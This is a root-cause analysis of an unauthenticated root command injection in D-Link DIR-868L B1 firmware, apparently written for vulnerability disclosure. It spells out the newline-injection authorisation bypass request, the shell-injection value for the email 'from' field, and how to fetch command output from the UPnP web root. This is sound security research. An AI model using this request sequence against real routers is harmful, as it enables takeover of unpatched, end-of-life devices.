# Root-cause analysis — DIR868L-AG0-RCE

D-Link DIR-868L B1 / firmware 2.03b01
`/goform/form_emailsetting` → `MYDLINKMAIL.php` unquoted `email -V -f` → root RCE

---

## 1. Attack surface: `/goform` → phpcgi

The admin HTTP server (`/sbin/httpd`, mathopd) serves `/goform` from
`/htdocs/mydlink` and hands every request to `/usr/sbin/phpcgi`
(a symlink to `/htdocs/cgibin`):

```
Alias /goform
Location /htdocs/mydlink
PathInfo On
External
{
    /usr/sbin/phpcgi { * }
}
```

The phpcgi handler (`sub_D638` in `/htdocs/cgibin`) builds one ePHP template
buffer for xmldb (`/var/run/xmldb_sock`, request type 0xa):

```
<script path>\n
_SERVER_<env>=<value>\n          (environment)
_GET_<key>=<value>\n             (query string, %XX-decoded by sub_212D8)
_POST_<key>=<value>\n            (body)
AUTHORIZED_GROUP=<sub_1134C()>\n (appended last)
SESSION_UID=<uid>\n
```

## 2. Gate bypass: newline injection + FIRST-WINS

Two properties combine:

1. `sub_212D8` URL-decodes `%XX` **including `%0a`**, so a query value can
   emit an additional `KEY=VALUE` line in the template.
2. The xmldb ePHP parser appends duplicate names at the tail (`sub_FFD4` →
   `sub_FEA4` → `sub_FDE0`) but resolves names from the head (`sub_10168`).
   Duplicate globals are therefore **FIRST-WINS**.

Request:

```
GET /goform/form_emailsetting?x=AAA%0aAUTHORIZED_GROUP=0
```

produces the template lines

```
_GET_x=AAA
AUTHORIZED_GROUP=0
...
AUTHORIZED_GROUP=-1
```

so `$AUTHORIZED_GROUP` evaluates to `0`. `/htdocs/mydlink/header.php` then
emits the success headers instead of exiting:

```php
if($AUTHORIZED_GROUP>=0) {
    echo "HTTP/1.1 200 OK\n";
    echo "Content-Type: text/html; charset=utf-8\n";
} else {
    exit;
}
```

Control: `GET /goform/form_emailsetting` → `500` (header.php exits, no CGI
output). Bypass: → `200` with body `fail` (the script runs; `$ret` is still
its default because `settingsChanged` is not set).

The same authorisation variable/primitive is known on this model from
CVE-2019-17506, which used `AUTHORIZED_GROUP=1%0a` against `getcfg.php` for
credential disclosure. This report uses a different endpoint and a different
impact; see the vulnerability report §10.

## 3. Email settings write path

`/htdocs/mydlink/form_emailsetting` (byte-identical in 2.01b05, 2.03b01 and
the 2.05 family):

```php
$SMTPEmailAddr      = $_POST["config.smtp_email_addr"];
$SMTPEmailFrom      = $_POST["config.smtp_email_from_email_addr"];
$SMTPEmailServerAddr= $_POST["config.smtp_email_server_addr"];
...
if($settingsChanged==1){
    if($SMTPEmailAddr!=""){
        set($SMTPP."/enable", "1");
        set($SMTPP."/from", $SMTPEmailFrom);      // attacker-controlled
        set($SMTPP."/to", $SMTPEmailAddr);
        ...
        if($SMTPEmailAction=="true") { event("MYDLINK_TESTMAIL"); }
    }
}
```

No character/length validation is performed on `from`.

## 4. Event registration and dispatch

`/etc/init0.d/S43mydlinkevent.sh` registers the handler at boot when the
device layout is `router` (factory default in
`/etc/defnodes/defaultvalue.xml`):

```sh
routermode="`xmldbc -g /device/layout`"
[ "$routermode" != "router" ] && exit 0
event MYDLINK_TESTMAIL add "mdtestmail"
```

The dispatch chain is:

```
event("MYDLINK_TESTMAIL")
  → servd event MYDLINK_TESTMAIL/default
    → mdtestmail
      → mydlinkeventd
        → phpsh /etc/scripts/mydlink/MYDLINKMAIL.php
```

`/usr/sbin/mydlinkeventd` contains the strings:

```
mdtestmail
phpsh %s SUBJECTPATH="%s" MAILPATH="%s"
/etc/scripts/mydlink/MYDLINKMAIL.php
```

`phpsh` renders the PHP script is executed with root privileges (the whole
web/event stack runs as root in this firmware).

## 5. Command construction: unquoted `from`

`/etc/scripts/mydlink/MYDLINKMAIL.php`:

```php
$from         = query("/device/log/email/from");
$username     = $from;
...
if ($authenable != "0")
{
    echo 'email'.
     ' -V '.
     ' -f '.$from.          // unquoted
     ' -n '.$displayfrom.
     ...
     ' -u '.$username.      // unquoted (same value)
     ' -i '.$password.
     ' '.$email_addr.' &\n';
}
else
{
    echo 'email'.
     ' -V '.
     ' -f '.$from.          // unquoted
     ' -n '.$username.      // unquoted (same value)
     ...
     ' '.$email_addr.' &\n';
}
```

The rendered line observed in the device console:

```
email -V  -f a;cd /var/htdocs/upnp/LAN-1;exec >out.gif 2>&1;<command>;# -n mydlink ... -u a;...# -i  x@y.z &
```

The shell executes `a`, then the injected commands; the trailing `#` comments
out the remainder (including the second copy of the payload in `-u`).

A minimal injection value:

```
a;cd /var/htdocs/upnp/LAN-1;exec >out.gif 2>&1;<command>;#
```

## 6. Output channel

The web root of the UPnP LAN vhost is `/var/htdocs/upnp/LAN-1` (symlinked as
`/htdocs/upnp/docs`), served on TCP/49152. The injected command redirects its
stdout/stderr there; the attacker fetches the result with
`GET http://TARGET:49152/out.gif`.

## 7. Version scope

The four files that implement the vulnerable path are byte-identical across
the available images:

| File | 2.01b05 | 2.03b01 | 2.05 | 2.05WW | 2.05b01 |
|---|---|---|---|---|---|
| `htdocs/mydlink/form_emailsetting` | e9baf8a1… | e9baf8a1… | e9baf8a1… | e9baf8a1… | e9baf8a1… |
| `htdocs/mydlink/header.php` | 802c8f84… | 802c8f84… | 802c8f84… | 802c8f84… | 802c8f84… |
| `etc/scripts/mydlink/MYDLINKMAIL.php` | b64d0ae2… | b64d0ae2… | b64d0ae2… | b64d0ae2… | b64d0ae2… |
| `usr/sbin/xmldb` | 74c06cef… | 74c06cef… | 74c06cef… | 74c06cef… | 74c06cef… |

Dynamic verification was performed on 2.03b01 (physical unit and FirmAE).
2.01b05 and the 2.05 family contain the same vulnerable files (static
comparison only).

## 8. Attack flow (single unauthenticated sequence)

```
attacker                                            DIR-868L B1
   |  GET /goform/form_emailsetting                      |
   |---------------------------------------------------->| 500 (header.php exit)
   |  GET /goform/form_emailsetting?x=AAA%0aAUTHORIZED_GROUP=0
   |---------------------------------------------------->| 200 "fail" (gate bypass)
   |  POST /goform/form_emailsetting?x=AAA%0aAUTHORIZED_GROUP=0
   |  settingsChanged=1&...&config.smtp_email_from_email_addr=<payload>&config.smtp_email_action=true
   |---------------------------------------------------->| writes /device/log/email/from
   |                                                     | event MYDLINK_TESTMAIL
   |                                                     | mdtestmail -> mydlinkeventd -> phpsh
   |                                                     | root sh: email -V -f <payload>
   |  GET http://TARGET:49152/out.gif                     |
   |<----------------------------------------------------| command output
```

## 9. Limitations / preconditions

- The `MYDLINK_TESTMAIL` handler is registered at boot only when
  `/device/layout == "router"` (factory default; verified on the physical
  unit). In a FirmAE image where `/device` is empty, the handler can be
  registered through the separate UPnP `gena.cgi`/`ssdpcgi` root channel; this
  is an emulator-only setup step and does not apply to a factory device.
- The gate bypass relies on the known ePHP newline/FIRST-WINS behaviour; the
  command-injection sink itself is independent of it and is reachable by any
  authenticated administrator.
- The device is EOL (D-Link SAP10397); no firmware fix is expected.
